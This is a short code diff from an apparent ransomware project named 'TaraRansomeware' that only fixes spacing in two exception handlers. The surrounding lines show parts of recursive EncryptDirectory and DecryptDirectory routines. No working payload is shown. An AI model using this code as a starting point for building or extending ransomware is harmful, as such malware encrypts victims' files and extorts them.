@@ -65,7 +65,7 @@ namespace TaraRansomeware.Engines
                     EncryptDirectory(cipPubKey, Path.GetFullPath(subDir));
                 });
             }
-            catch(System.UnauthorizedAccessException e)
+            catch (System.UnauthorizedAccessException e)
             {
                 Console.WriteLine(e.Message);
             }
@@ -100,7 +100,7 @@ namespace TaraRansomeware.Engines
                     DecryptDirectory(cipPrivKey, Path.GetFullPath(subDir));
                 });
             }
-            catch(System.UnauthorizedAccessException e)
+            catch (System.UnauthorizedAccessException e)
             {
                 Console.WriteLine(e.Message);
             }
